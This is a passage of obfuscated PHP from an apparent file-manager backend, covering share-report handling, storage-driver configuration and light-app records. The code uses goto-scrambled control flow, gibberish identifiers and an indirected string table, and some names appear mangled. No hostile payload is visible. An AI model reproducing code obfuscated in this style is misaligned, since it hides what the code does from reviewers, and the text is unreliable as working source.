"\x25{$e¥Ã»öÑ±Ã[$A…ªø§Ìù®[2193]]}\x25"), $A…ªø§Ìù®[2240] => $A…ªø§Ìù®[2197]); } goto AõÁõøæŞ; f‡“òÈÛ×: return $e‚ä¿ÁÜ½é; goto d®í‘ùëŞÕ; AõÁõøæŞ: $e‚ä¿ÁÜ½é = $this->_makeOrder()->where($a§•ñÎƒÅà)->selectPage(20); if (empty($e‚ä¿ÁÜ½é[$A…ªø§Ìù®[354]])) { return array(); } $this->_listDataApply($e‚ä¿ÁÜ½é[$A…ªø§Ìù®[354]]); goto f‡“òÈÛ×; EÏéœËùõ: $A…ªø§Ìù® =& $_SERVER[¦·]; $a§•ñÎƒÅà = array(); if ($e¥Ã»öÑ±Ã[$A…ªø§Ìù®[1441]]) { $a§•ñÎƒÅà[$A…ªø§Ìù®[1441]] = $e¥Ã»öÑ±Ã[$A…ªø§Ìù®[1441]]; } goto Bó ¬‡Â˜Ç; d®í‘ùëŞÕ: } public function listDataApply($BôèŒÃöÂÊ) { $this->_listDataApply($BôèŒÃöÂÊ); return $BôèŒÃöÂÊ; } private function _listDataApply(&$B¾À¯–ùêÕ) { goto A¬•çµ‚‚; c —·œáïó: unset($CíÕÃì¨£¼); goto b›ÈÅ§É·Ô; eøÌ¢¾õ¦: $dç…ÙÛ§œà = array_to_keyvalue($B¾À¯–ùêÕ, $aŒÖÙ‚Œœ[33], $aŒÖÙ‚Œœ[369]); $bëÄ…ÜÌ Ò = Model($aŒÖÙ‚Œœ[753])->sourceListInfo($dç…ÙÛ§œà, !0); foreach ($B¾À¯–ùêÕ as &$CíÕÃì¨£¼) { $aÓô™Àğª‘ = $CíÕÃì¨£¼[$aŒÖÙ‚Œœ[1441]]; $CíÕÃì¨£¼[$aŒÖÙ‚Œœ[2265]] = $F ±ïÃ§Â[$aÓô™Àğª‘] ? $F ±ïÃ§Â[$aÓô™Àğª‘] : !1; $Ešİ®æÌÕ® = $CíÕÃì¨£¼[$aŒÖÙ‚Œœ[369]]; $CíÕÃì¨£¼[$aŒÖÙ‚Œœ[391]] = $bëÄ…ÜÌ Ò[$Ešİ®æÌÕ®] ? $bëÄ…ÜÌ Ò[$Ešİ®æÌÕ®] : !1; } goto c —·œáïó; A¬•çµ‚‚: $aŒÖÙ‚Œœ =& $_SERVER[¦·]; $aåĞ‹ã‘¢‰ = array_to_keyvalue($B¾À¯–ùêÕ, $aŒÖÙ‚Œœ[33], $aŒÖÙ‚Œœ[1441]); $F ±ïÃ§Â = Model($aŒÖÙ‚Œœ[479])->userListInfo(array_unique($aåĞ‹ã‘¢‰)); goto eøÌ¢¾õ¦; b›ÈÅ§É·Ô: } private function _makeOrder($C—ê«·§¹ = '') { goto FâÔÖÌàëê; Eƒ©‰¸ğ: $c¤«ºˆĞ¯ = Input::get($BÑÁåÕ¶‡š[407], $BÑÁåÕ¶‡š[7], $BÑÁåÕ¶‡š[389], $cÉœÍª­µ¡); $EÙƒÓÍƒ = Input::get($BÑÁåÕ¶‡š[408], $BÑÁåÕ¶‡š[7], $BÑÁåÕ¶‡š[2266], array($BÑÁåÕ¶‡š[2192], $BÑÁåÕ¶‡š[404])); $EÙƒÓÍƒ = $b—õæÊ°½Î[$EÙƒÓÍƒ]; goto e¡›Å†‡ƒ; FâÔÖÌàëê: $BÑÁåÕ¶‡š =& $_SERVER[¦·]; $cÉœÍª­µ¡ = array($BÑÁåÕ¶‡š[187], $BÑÁåÕ¶‡š[449], $BÑÁåÕ¶‡š[2252], $BÑÁåÕ¶‡š[2253]); $b—õæÊ°½Î = array($BÑÁåÕ¶‡š[402] => $BÑÁåÕ¶‡š[403], $BÑÁåÕ¶‡š[404] => $BÑÁåÕ¶‡š[405]); goto Eƒ©‰¸ğ; e¡›Å†‡ƒ: $C—ê«·§¹ = $C—ê«·§¹ . "{$c¤«ºˆĞ¯}\x20{$EÙƒÓÍƒ}"; return $this->order($C—ê«·§¹); goto aØ‰åè¥àŞ; aØ‰åè¥àŞ: } public function reportAdd($bğ ¡½Ì¨) { $Aä‚ï¤â =& $_SERVER[¦·]; $Dàä»Ì³‰¨ = array($Aä‚ï¤â[441] => $bğ ¡½Ì¨[$Aä‚ï¤â[441]], $Aä‚ï¤â[1441] => USER_ID); if (Model($Aä‚ï¤â[2262])->where($Dàä»Ì³‰¨)->find()) { return !1; } $CÎ°¯‚Œ¤ˆ = array($Aä‚ï¤â[441] => $bğ ¡½Ì¨[$Aä‚ï¤â[441]], $Aä‚ï¤â[1347] => $bğ ¡½Ì¨[$Aä‚ï¤â[1347]], $Aä‚ï¤â[369] => $bğ ¡½Ì¨[$Aä‚ï¤â[369]], $Aä‚ï¤â[419] => $bğ ¡½Ì¨[$Aä‚ï¤â[419]], $Aä‚ï¤â[1441] => USER_ID, $Aä‚ï¤â[29] => $bğ ¡½Ì¨[$Aä‚ï¤â[29]], $Aä‚ï¤â[405] => $bğ ¡½Ì¨[$Aä‚ï¤â[405]]); return Model($Aä‚ï¤â[2262])->add($CÎ°¯‚Œ¤ˆ); } public function reportList($B„ÌôÃÃ•) { goto f‹šÌëİÜé; aßØ…æ‰„Ë: $CÇ‡ÀÕ¼İã = array($Bª—ò¿›ë¦[402] => $Bª—ò¿›ë¦[403], $Bª—ò¿›ë¦[404] => $Bª—ò¿›ë¦[405]); $aÓ•Ãæ³—ù = $Bª—ò¿›ë¦[2270] . $CÇ‡ÀÕ¼İã[$b­¹©ƒ¤Ôâ]; $cõÑ¤Ç®ˆ® = Model($Bª—ò¿›ë¦[2262])->where($C¥æÚŸ¥¦)->order($aÓ•Ãæ³—ù)->selectPage(20); goto Dµø–ê¸ ‹; Dµø–ê¸ ‹: if (empty($cõÑ¤Ç®ˆ®[$Bª—ò¿›ë¦[354]])) { return array(); } $this->_listDataApply($cõÑ¤Ç®ˆ®[$Bª—ò¿›ë¦[354]]); return $cõÑ¤Ç®ˆ®; goto BªÛ ‡‰¼ó; f‹šÌëİÜé: $Bª—ò¿›ë¦ =& $_SERVER[¦·]; $C¥æÚŸ¥¦ = array(); if ($B„ÌôÃÃ•[$Bª—ò¿›ë¦[703]]) { $FÖÕ©¡¥­â = $B„ÌôÃÃ•[$Bª—ò¿›ë¦[449]] ? $B„ÌôÃÃ•[$Bª—ò¿›ë¦[449]] : strtotime(date($Bª—ò¿›ë¦[2264])); $C¥æÚŸ¥¦[$Bª—ò¿›ë¦[187]] = array($Bª—ò¿›ë¦[321], array($B„ÌôÃÃ•[$Bª—ò¿›ë¦[703]], $FÖÕ©¡¥­â)); } goto CŸºÜ¬¹•Õ; CŸºÜ¬¹•Õ: if (isset($B„ÌôÃÃ•[$Bª—ò¿›ë¦[29]]) && in_array($B„ÌôÃÃ•[$Bª—ò¿›ë¦[29]], array($Bª—ò¿›ë¦[83], $Bª—ò¿›ë¦[2267], $Bª—ò¿›ë¦[2268], $Bª—ò¿›ë¦[2269], $Bª—ò¿›ë¦[1927]))) { $C¥æÚŸ¥¦[$Bª—ò¿›ë¦[29]] = $B„ÌôÃÃ•[$Bª—ò¿›ë¦[29]]; } if (isset($B„ÌôÃÃ•[$Bª—ò¿›ë¦[690]]) && in_array($B„ÌôÃÃ•[$Bª—ò¿›ë¦[690]], array($Bª—ò¿›ë¦[470], $Bª—ò¿›ë¦[83], $Bª—ò¿›ë¦[2267], $Bª—ò¿›ë¦[2268]))) { $C¥æÚŸ¥¦[$Bª—ò¿›ë¦[690]] = $B„ÌôÃÃ•[$Bª—ò¿›ë¦[690]]; } $b­¹©ƒ¤Ôâ = Input::get($Bª—ò¿›ë¦[408], $Bª—ò¿›ë¦[7], $Bª—ò¿›ë¦[2266], array($Bª—ò¿›ë¦[2192], $Bª—ò¿›ë¦[404])); goto aßØ…æ‰„Ë; BªÛ ‡‰¼ó: } public function reportStatus($fó˜ğÕ¶Û) { goto B©åĞÎ¡•ä; B©åĞÎ¡•ä: $eÖì¶°×¿Ó =& $_SERVER[¦·]; $eí¬š·ìÚ = array($eÖì¶°×¿Ó[367] => $fó˜ğÕ¶Û[$eÖì¶°×¿Ó[367]]); $F—ŸÎø¹­ = Model($eÖì¶°×¿Ó[2262])->where($eí¬š·ìÚ)->field($eÖì¶°×¿Ó[2271])->find(); goto bÒ›õ†ôäÈ; aääÑ²¼Œ: $d½ˆ¶¢Í·ö = Model($eÖì¶°×¿Ó[2262])->where($eí¬š·ìÚ)->save($Fš¶‡‘Üğ); if ($fó˜ğÕ¶Û[$eÖì¶°×¿Ó[690]] == $eÖì¶°×¿Ó[2267]) { if ($F—ŸÎø¹­[$eÖì¶°×¿Ó[419]] != $eÖì¶°×¿Ó[470] && $this->shareFileMeta($F—ŸÎø¹­[$eÖì¶°×¿Ó[419]])) { $this->shareFileMeta($F—ŸÎø¹­[$eÖì¶°×¿Ó[419]], 0); } $this->remove($F—ŸÎø¹­[$eÖì¶°×¿Ó[441]]); return !0; } if ($d½ˆ¶¢Í·ö && $fó˜ğÕ¶Û[$eÖì¶°×¿Ó[690]] == $eÖì¶°×¿Ó[2268]) { $a„Æä¶­‘Œ = $Fš¶‡‘Üğ[$eÖì¶°×¿Ó[690]] == $eÖì¶°×¿Ó[2268] ? 1 : 0; $this->shareFileMeta($F—ŸÎø¹­[$eÖì¶°×¿Ó[419]], $a„Æä¶­‘Œ); $this->removeByFile($F—ŸÎø¹­[$eÖì¶°×¿Ó[419]]); } goto fÀ¨µ§œ¨è; fÀ¨µ§œ¨è: return $d½ˆ¶¢Í·ö; goto eì±¿Ï‰¤; bÒ›õ†ôäÈ: if (!$F—ŸÎø¹­) { return !1; } $Fš¶‡‘Üğ = array($eÖì¶°×¿Ó[690] => $fó˜ğÕ¶Û[$eÖì¶°×¿Ó[690]]); if ($fó˜ğÕ¶Û[$eÖì¶°×¿Ó[690]] == $eÖì¶°×¿Ó[2268] && $F—ŸÎø¹­[$eÖì¶°×¿Ó[690]] == $eÖì¶°×¿Ó[2268]) { $Fš¶‡‘Üğ[$eÖì¶°×¿Ó[690]] = 0; } goto aääÑ²¼Œ; eì±¿Ï‰¤: } private function removeByFile($CÌÊ«ëº‚É) { goto EÎÒ×¯ì‡; bìæ¡î : $bÏ®ä´Ÿóº = array_to_keyvalue($F—½ÛÖº¯¿, $f…’¬æáİ[33], $f…’¬æáİ[441]); $this->remove($bÏ®ä´Ÿóº); goto cŒîéº®; f‡Û¸‘ºº: $cê´‰‘„ºº = array($f…’¬æáİ[369] => array($f…’¬æáİ[7], $DàŸ¯‚ßß), $f…’¬æáİ[446] => 1); $F—½ÛÖº¯¿ = Model($f…’¬æáİ[2089])->where($cê´‰‘„ºº)->field($f…’¬æáİ[441])->select(); if (empty($F—½ÛÖº¯¿)) { return; } goto bìæ¡î ; EÎÒ×¯ì‡: $f…’¬æáİ =& $_SERVER[¦·]; $F—½ÛÖº¯¿ = Model($f…’¬æáİ[753])->where(array($f…’¬æáİ[419] => $CÌÊ«ëº‚É))->field($f…’¬æáİ[369])->select(); $DàŸ¯‚ßß = array_to_keyvalue($F—½ÛÖº¯¿, $f…’¬æáİ[33], $f…’¬æáİ[369]); goto f‡Û¸‘ºº; cŒîéº®: } private function shareFileMeta($C¬…·’åÅ¶, $E¾›»°ÇŸ´ = null) { $D²²Ü­É ‡ =& $_SERVER[¦·]; $D‘ïï¤ŞÄÓ = array($D²²Ü­É ‡[419] => $C¬…·’åÅ¶, $D²²Ü­É ‡[89] => $D²²Ü­É ‡[2272]); if (is_null($E¾›»°ÇŸ´)) { return Model($D²²Ü­É ‡[2273])->where($D‘ïï¤ŞÄÓ)->find(); } $D‘ïï¤ŞÄÓ[$D²²Ü­É ‡[359]] = $E¾›»°ÇŸ´; Model($D²²Ü­É ‡[2273])->add($D‘ïï¤ŞÄÓ, array(), !0); } } goto b‰·ò”Ğ×—; E¥‰¨…”Áò: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\163\164\157\162\x61\147\x65\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\151\172\x65\115\x61\170", "\x73\171\x73\x74\x65\x6d", "\144\x65\146\x61\165\154\164", "\144\x72\151\x76\x65\162", "\143\157\x6e\146\151\147"); public function listData($b›‰§Íèø = false, $fİ®‘æ„ = "\x6d\157\x64\151\146\x79\124\x69\x6d\x65", $f’±°½Ã = false) { goto cÖÏ³Î¯; e«æâ¡Î: return $c‰³ÁÎ‡£È; goto CÖ•Ëâ´Œë; e“êó§Üñ: foreach ($c‰³ÁÎ‡£È as $d³ëŠ·³¶« => $A ‹†ãİÉÅ) { unset($c‰³ÁÎ‡£È[$d³ëŠ·³¶«][$D–½â‹§“[6]]); $c‰³ÁÎ‡£È[$d³ëŠ·³¶«][$D–½â‹§“[2098]] = 0; } $bŒíÔšõ = array_to_keyvalue($c‰³ÁÎ‡£È, $D–½â‹§“[33], $D–½â‹§“[367]); $this->_listAppendSize($c‰³ÁÎ‡£È, $bŒíÔšõ); goto e«æâ¡Î; cÖÏ³Î¯: $D–½â‹§“ =& $_SERVER[¦·]; $c‰³ÁÎ‡£È = parent::listData($b›‰§Íèø, $fİ®‘æ„, $f’±°½Ã); if ($b›‰§Íèø) { return $c‰³ÁÎ‡£È; } goto e“êó§Üñ; CÖ•Ëâ´Œë: } public function _listAppendSize(&$C¯ìßÃí³Ü, $F’ºöÍàÑ¶) { $Bõƒ¯ºÜ×„ =& $_SERVER[¦·]; if (!$F’ºöÍàÑ¶) { return; } $b×šÈ©È¨¸ = $Bõƒ¯ºÜ×„[2401] . implode($Bõƒ¯ºÜ×„[47], $F’ºöÍàÑ¶) . $Bõƒ¯ºÜ×„[2402]; $BÁÌĞ­¶™¹ = Model($Bõƒ¯ºÜ×„[719])->query($b×šÈ©È¨¸); $BÁÌĞ­¶™¹ = array_to_keyvalue($BÁÌĞ­¶™¹, $Bõƒ¯ºÜ×„[367], $Bõƒ¯ºÜ×„[77]); foreach ($C¯ìßÃí³Ü as $bòÙçííîó => $B¹£Ã§ÁÊ) { $C¯ìßÃí³Ü[$bòÙçííîó][$Bõƒ¯ºÜ×„[2098]] = isset($BÁÌĞ­¶™¹[$B¹£Ã§ÁÊ[$Bõƒ¯ºÜ×„[367]]]) ? $BÁÌĞ­¶™¹[$B¹£Ã§ÁÊ[$Bõƒ¯ºÜ×„[367]]] : 0; } } public function getConfig($dˆÃ¹±à÷Õ) { $E†Á¢™ôø = parent::listData($dˆÃ¹±à÷Õ); return json_decode($E†Á¢™ôø[$_SERVER[¦·][6]], !0); } public function update($b¿á„Ğèäô, $BÌÌøâÉ¾ç) { goto c³ƒÙìÆƒ”; c³ƒÙìÆƒ”: $e¸º¦ÃŠäí =& $_SERVER[¦·]; $CÉ·óÎ¹›Ë = $BÌÌøâÉ¾ç[$e¸º¦ÃŠäí[28]]; $dçÚÃ£²ƒ = array_to_keyvalue(parent::listData(), $e¸º¦ÃŠäí[28]); goto C±Œ­÷íˆœ; C±Œ­÷íˆœ: if (isset($dçÚÃ£²ƒ[$CÉ·óÎ¹›Ë]) && $dçÚÃ£²ƒ[$CÉ·óÎ¹›Ë][$e¸º¦ÃŠäí[367]] != $b¿á„Ğèäô) { return !1; } if (isset($BÌÌøâÉ¾ç[$e¸º¦ÃŠäí[2403]]) && $BÌÌøâÉ¾ç[$e¸º¦ÃŠäí[2403]] == $e¸º¦ÃŠäí[83]) { $this->checkConfig($BÌÌøâÉ¾ç); } unset($BÌÌøâÉ¾ç[$e¸º¦ÃŠäí[2403]]); goto AÂ™‡Ë…¦É; AÂ™‡Ë…¦É: $DÕˆªİË“è = parent::update($b¿á„Ğèäô, $BÌÌøâÉ¾ç); if ($DÕˆªİË“è && $BÌÌøâÉ¾ç[$e¸º¦ÃŠäí[34]]) { foreach ($dçÚÃ£²ƒ as $aÉ…å§İ«’) { if ($aÉ…å§İ«’[$e¸º¦ÃŠäí[34]] && $aÉ…å§İ«’[$e¸º¦ÃŠäí[367]] != $b¿á„Ğèäô) { parent::update($aÉ…å§İ«’[$e¸º¦ÃŠäí[367]], array($e¸º¦ÃŠäí[34] => 0)); } } } return $DÕˆªİË“è; goto AƒéÀ³â’; AƒéÀ³â’: } public function add($DëÔóÆê¬§) { goto E¿ÂÊİ½ª‚; EÕ‹§†ìå±: $this->checkConfig($DëÔóÆê¬§); $bŞ§Õï³®Ì = parent::insert($DëÔóÆê¬§); if ($bŞ§Õï³®Ì && $DëÔóÆê¬§[$FÁ¦áê”­ [34]]) { foreach ($Aí”†ƒ¹¢ as $B‘ØœÑÑˆ¬) { if ($B‘ØœÑÑˆ¬[$FÁ¦áê”­ [34]]) { parent::update($B‘ØœÑÑˆ¬[$FÁ¦áê”­ [367]], array($FÁ¦áê”­ [34] => 0)); } } } goto eöÍ¼§íòª; E¿ÂÊİ½ª‚: $FÁ¦áê”­  =& $_SERVER[¦·]; $Aí”†ƒ¹¢ = array_to_keyvalue(parent::listData(), $FÁ¦áê”­ [28]); if (isset($Aí”†ƒ¹¢[$DëÔóÆê¬§[$FÁ¦áê”­ [28]]])) { return !1; } goto EÕ‹§†ìå±; eöÍ¼§íòª: return $bŞ§Õï³®Ì; goto e¯òîô¤Ş«; e¯òîô¤Ş«: } public function checkConfig(&$aŒŞ¥Û¸) { goto b‡ÔÃå¦°ó; dòáÂŸô†é: $Aàğ¨‡©Œ = $fÄ¦»¸‹ŒŠ[71] . $AÁŞ¿¨‹Ã“; if (!$AÁŞ¿¨‹Ã“ || !class_exists($Aàğ¨‡©Œ)) { write_log(array($fÄ¦»¸‹ŒŠ[2405], $aŒŞ¥Û¸, get_caller_info()), $fÄ¦»¸‹ŒŠ[2406]); show_json($fÄ¦»¸‹ŒŠ[2407], !1, $aŒŞ¥Û¸); } $AÄ†«…Ó¦„ = new $Aàğ¨‡©Œ($fÎÈ‰Ò¬ƒŒ); goto Bóì•·˜±; b‡ÔÃå¦°ó: $fÄ¦»¸‹ŒŠ =& $_SERVER[¦·]; $F¥ê°Äß®» = strtolower($aŒŞ¥Û¸[$fÄ¦»¸‹ŒŠ[90]]); $fÎÈ‰Ò¬ƒŒ = json_decode($aŒŞ¥Û¸[$fÄ¦»¸‹ŒŠ[6]], !0); goto A´»”õï; cÑ¼Ğ¹À: if (!$AÄ†«…Ó¦„->mkfile($D‰ª…ÆÊ)) { show_json(LNG($fÄ¦»¸‹ŒŠ[2408]), !1); } $fÎÈ‰Ò¬ƒŒ[$fÄ¦»¸‹ŒŠ[1027]] = $EÂÛËÉÊ; $aŒŞ¥Û¸[$fÄ¦»¸‹ŒŠ[6]] = json_encode($fÎÈ‰Ò¬ƒŒ); goto F•Ğí­í‡º; A´»”õï: foreach ($fÎÈ‰Ò¬ƒŒ as $C¶Œ­ŒŠ => $fÎí»š£ÑÕ) { $fÎÈ‰Ò¬ƒŒ[$C¶Œ­ŒŠ] = trim($fÎí»š£ÑÕ); } $fÎÈ‰Ò¬ƒŒ[$fÄ¦»¸‹ŒŠ[2404]] = rand_string(6); $AÁŞ¿¨‹Ã“ = $this->driverType($F¥ê°Äß®»); goto dòáÂŸô†é; Bóì•·˜±: if (in_array($F¥ê°Äß®», $AÄ†«…Ó¦„->objectDriver)) { if (!$AÄ†«…Ó¦„->isBucketCors() && !$AÄ†«…Ó¦„->setBucketCors()) { $fÑå¤›º¤ë = LNG($fÄ¦»¸‹ŒŠ[2408]); $fÑå¤›º¤ë .= $fÄ¦»¸‹ŒŠ[2409] . LNG($fÄ¦»¸‹ŒŠ[2410]); show_json($fÑå¤›º¤ë, !1); } } $EÂÛËÉÊ = rtrim($fÎÈ‰Ò¬ƒŒ[$fÄ¦»¸‹ŒŠ[1027]], $fÄ¦»¸‹ŒŠ[8]) . $fÄ¦»¸‹ŒŠ[8]; $D‰ª…ÆÊ = $AÄ†«…Ó¦„->getPath($EÂÛËÉÊ . $fÄ¦»¸‹ŒŠ[1993]); goto cÑ¼Ğ¹À; F•Ğí­í‡º: $aŒŞ¥Û¸[$fÄ¦»¸‹ŒŠ[90]] = $AÁŞ¿¨‹Ã“; return !0; goto a¶˜Ë·ŞÁó; a¶˜Ë·ŞÁó: } private function driverType($DÔ¬Œ¾˜İç) { $d¸š˜Â¯Œí =& $_SERVER[¦·]; $FåÓ¹¨öÀ = array($d¸š˜Â¯Œí[102] => $d¸š˜Â¯Œí[2411], $d¸š˜Â¯Œí[58] => $d¸š˜Â¯Œí[2412], $d¸š˜Â¯Œí[64] => $d¸š˜Â¯Œí[2413]); if (isset($FåÓ¹¨öÀ[$DÔ¬Œ¾˜İç])) { return $FåÓ¹¨öÀ[$DÔ¬Œ¾˜İç]; } return strtoupper($DÔ¬Œ¾˜İç); } public function driverListSystem() { $DÓ£Ú„…ÙÀ =& $_SERVER[¦·]; $B™İµö¹Ô” = parent::listData(); $EŠœÔ°”Æ = array(); foreach ($B™İµö¹Ô” as $fëå´”°İÅ) { unset($fëå´”°İÅ[$DÓ£Ú„…ÙÀ[187]], $fëå´”°İÅ[$DÓ£Ú„…ÙÀ[107]]); $fëå´”°İÅ[$DÓ£Ú„…ÙÀ[6]] = json_decode($fëå´”°İÅ[$DÓ£Ú„…ÙÀ[6]], !0); $EŠœÔ°”Æ[] = $fëå´”°İÅ; } return $EŠœÔ°”Æ; } public function defaultDriver() { $e‹ÜØ¥…¥ =& $_SERVER[¦·]; $bĞÔÉÅ¢â = parent::listData(); $cªòŞÙØñ– = array_filter_by_field($bĞÔÉÅ¢â, $e‹ÜØ¥…¥[34], 1); $cªòŞÙØñ– = $cªòŞÙØñ–[0]; if ($cªòŞÙØñ–) { $cªòŞÙØñ–[$e‹ÜØ¥…¥[6]] = json_decode($cªòŞÙØñ–[$e‹ÜØ¥…¥[6]], !0); } return $cªòŞÙØñ–; } public function driverInfo($f•‘Ì‚‘”å) { $BáÔš¾¯ÙÚ =& $_SERVER[¦·]; $c˜°¼­ßÆ• = array_to_keyvalue(parent::listData(), $BáÔš¾¯ÙÚ[367]); if (!isset($c˜°¼­ßÆ•[$f•‘Ì‚‘”å])) { return !1; } $dÅßÜ‰•¦ñ = $c˜°¼­ßÆ•[$f•‘Ì‚‘”å]; $dÅßÜ‰•¦ñ[$BáÔš¾¯ÙÚ[6]] = json_decode($dÅßÜ‰•¦ñ[$BáÔš¾¯ÙÚ[6]], !0); return $dÅßÜ‰•¦ñ; } public function remove($B‡ÑË¶ùˆ«) { $this->removeShareItems($B‡ÑË¶ùˆ«); return parent::remove($B‡ÑË¶ùˆ«); } public function removeWithFile($DÑÒ°²ƒ·ç) { goto aŒÄ¯ÂÁ; fê‘½ÀÛ¹‚: if (!$eÖ‘àÂ²æä) { $Eµ–¦Àß°->stop($A¡¹©Å£Ï); return !1; } $Eµ–¦Àß°->end(); $this->remove($DÑÒ°²ƒ·ç); goto E’ÄÆ¢ˆé‚; d‘ß„¯: $còÈË”ØÇ¸ = Model($b­Ü™¸¦[422])->where($a¤ÚÑ‰¿ÏŠ)->sum($b­Ü™¸¦[77]); $A¡¹©Å£Ï = $b­Ü™¸¦[2414] . $DÑÒ°²ƒ·ç; $Eµ–¦Àß° = new TaskFileTransfer($A¡¹©Å£Ï, $b­Ü™¸¦[2406], $C”±¬œº¥æ, LNG($b­Ü™¸¦[2415]) . "\50{$DÑÒ°²ƒ·ç}\x29"); goto bÃÇÕ·”…Ä; bÓÃæóòã: $c²š£åˆ–± = "\173\x69\x6f\x3a{$CÒ°äë§„}\x7d\57"; $eÖ‘àÂ²æä = !0; $fÏ§ˆğ²˜Ş = array(); goto EÚêŒƒ¬Ê»; aŒÄ¯ÂÁ: $b­Ü™¸¦ =& $_SERVER[¦·]; $a¤ÚÑ‰¿ÏŠ = array($b­Ü™¸¦[744] => $DÑÒ°²ƒ·ç); $C”±¬œº¥æ = Model($b­Ü™¸¦[422])->where($a¤ÚÑ‰¿ÏŠ)->count(); goto d‘ß„¯; EÚêŒƒ¬Ê»: $b´Ş»Ã³ãÛ = Model($b­Ü™¸¦[167])->where($a¤ÚÑ‰¿ÏŠ)->field($b­Ü™¸¦[2416])->select(); foreach ($b´Ş»Ã³ãÛ as $dšøÓöáÛÒ) { goto DœãÂÚ«™Ï; DœãÂÚ«™Ï: $B¼™¿¨†Îã = $dšøÓöáÛÒ[$b­Ü™¸¦[75]]; $aÎ¦¼š¨¨¬ = $c²š£åˆ–± . str_replace("\x7b\x69\x6f\72{$DÑÒ°²ƒ·ç}\x7d\57", $b­Ü™¸¦[33], $B¼™¿¨†Îã); if (!IO::exist($B¼™¿¨†Îã)) { $fÏ§ˆğ²˜Ş[] = $dšøÓöáÛÒ[$b­Ü™¸¦[419]]; $Eµ–¦Àß°->updateFileEnd($dšøÓöáÛÒ[$b­Ü™¸¦[28]], $dšøÓöáÛÒ[$b­Ü™¸¦[77]]); continue; } goto FÄÜ»øö¥Ø; FÄÜ»øö¥Ø: if (IO::exist($aÎ¦¼š¨¨¬)) { $Eµ–¦Àß°->updateFileEnd($dšøÓöáÛÒ[$b­Ü™¸¦[28]], $dšøÓöáÛÒ[$b­Ü™¸¦[77]]); continue; } if (!IO::move($B¼™¿¨†Îã, get_path_father($aÎ¦¼š¨¨¬))) { $eÖ‘àÂ²æä = !1; break; } $a¤ÚÑ‰¿ÏŠ = array($b­Ü™¸¦[419] => $dšøÓöáÛÒ[$b­Ü™¸¦[419]]); goto cÂŸ Üó‡Ô; cÂŸ Üó‡Ô: $eŸ—Ò½Ôº¡ = array($b­Ü™¸¦[744] => $CÒ°äë§„, $b­Ü™¸¦[75] => $aÎ¦¼š¨¨¬); Model($b­Ü™¸¦[167])->where($a¤ÚÑ‰¿ÏŠ)->save($eŸ—Ò½Ôº¡); goto A¨Ã‰ÖŒ; A¨Ã‰ÖŒ: } $this->removeByFileID($fÏ§ˆğ²˜Ş); goto fê‘½ÀÛ¹‚; bÃÇÕ·”…Ä: $Eµ–¦Àß°->task[$b­Ü™¸¦[699]] = (double) $còÈË”ØÇ¸; $CÖùº‹¶¾± = KodIO::defaultDriver(); $CÒ°äë§„ = $CÖùº‹¶¾±[$b­Ü™¸¦[367]]; goto bÓÃæóòã; E’ÄÆ¢ˆé‚: } public function progress($BŸ«Ö±·’ˆ) { return Task::get($_SERVER[¦·][2414] . $BŸ«Ö±·’ˆ); } private function removeByFileID($aµ½¥øÉƒ© = array()) { goto e‘Êó†•Ñ”; eÇõ¸œ›ï™: foreach ($fòœ§õÕÆä as $E«¤š¦Ï—ë) { Model($D›¼éî‰[382])->removeNow($E«¤š¦Ï—ë, !1); } goto eš”Ò§ŠíË; e‘Êó†•Ñ”: $D›¼éî‰ =& $_SERVER[¦·]; if (empty($aµ½¥øÉƒ©)) { return; } $D† Å×ë = array($D›¼éî‰[419] => array($D›¼éî‰[7], $aµ½¥øÉƒ©)); goto D„ˆ²˜å•; D„ˆ²˜å•: $fòœ§õÕÆä = Model($D›¼éî‰[1122])->where($D† Å×ë)->field($D›¼éî‰[369])->select(); if (!$fòœ§õÕÆä) { return; } $fòœ§õÕÆä = array_to_keyvalue($fòœ§õÕÆä, $D›¼éî‰[33], $D›¼éî‰[369]); goto eÇõ¸œ›ï™; eš”Ò§ŠíË: } private function removeShareItems($d³ñŸ¬Ó´–) { goto d…ĞÃö­ÉÖ; d…ĞÃö­ÉÖ: $féåÔå“º =& $_SERVER[¦·]; $Cİ İÙøø… = "\x7b\x69\x6f\x3a{$d³ñŸ¬Ó´–}\x7d\x2f"; $fÊŒªœ¸ÃÁ = array($féåÔå“º[369] => 0, $féåÔå“º[1022] => array($féåÔå“º[752], "{$Cİ İÙøø…}\45")); goto E‰ª…«‚£Ï; BØÕ…ğ‡¿: Model($féåÔå“º[537])->remove($Dì‰ìœ¤‰Â); goto F¿«¬ÛŠæÜ; E‰ª…«‚£Ï: $FŠ´ñÎ‡¶ = Model($féåÔå“º[2089])->where($fÊŒªœ¸ÃÁ)->field($féåÔå“º[441])->select(); if (empty($FŠ´ñÎ‡¶)) { return; } $Dì‰ìœ¤‰Â = array_to_keyvalue($FŠ´ñÎ‡¶, $féåÔå“º[33], $féåÔå“º[441]); goto BØÕ…ğ‡¿; F¿«¬ÛŠæÜ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\x4c\151\147\x68\x74\x41\160\160"; public $modelType = "\x53\171\x73\x74\x65\x6d\117\160\x74\151\157\156"; public $field = array("\156\x61\x6d\x65", "\147\x72\157\x75\160", "\144\x65\163\143", "\x63\157\156\164\x65\x6e\x74"); public function listData($b‰¥¶ï¢ìø = false, $E–Êñô‚†Ö = "\155\157\x64\x69\x66\171\124\x69\x6d\x65", $cïœÍ—Õå = true) { return parent::listData($b‰¥¶ï¢ìø, $E–Êñô‚†Ö, $cïœÍ—Õå); } public function remove($E˜Ã¯†³³”) { $EÌ½¥ÑØßö = $this->findByName($E˜Ã¯†³³”); if (!$EÌ½¥ÑØßö) { return !1; } return parent::remove($EÌ½¥ÑØßö[$_SERVER[¦·][367]]); } public function add($E®Ë¯±Ùö) { if ($this->findByName($E®Ë¯±Ùö[$_SERVER[¦·][28]])) { return !1; } return parent::insert($E®Ë¯±Ùö); } public function update($d¬“¡…í‚, $FµÃÉ §Ñ) { $fº‰ªÆ³ =& $_SERVER[¦·]; $cÂ‡ù‹ø´™ = $this->findByName($d¬“¡…í‚); $d·Ö«¹ = $this->findByName($FµÃÉ §Ñ[$fº‰ªÆ³[28]]); if (!$cÂ‡ù‹ø´™ || $d·Ö«¹ && $d·Ö«¹[$fº‰ªÆ³[367]] != $cÂ‡ù‹ø´™[$fº‰ªÆ³[367]]) { return !1; } return parent::update($cÂ‡ù‹ø´™[$fº‰ªÆ³[367]], $FµÃÉ §Ñ); } } class SystemLogModel extends ModelBase { protected $tableName = 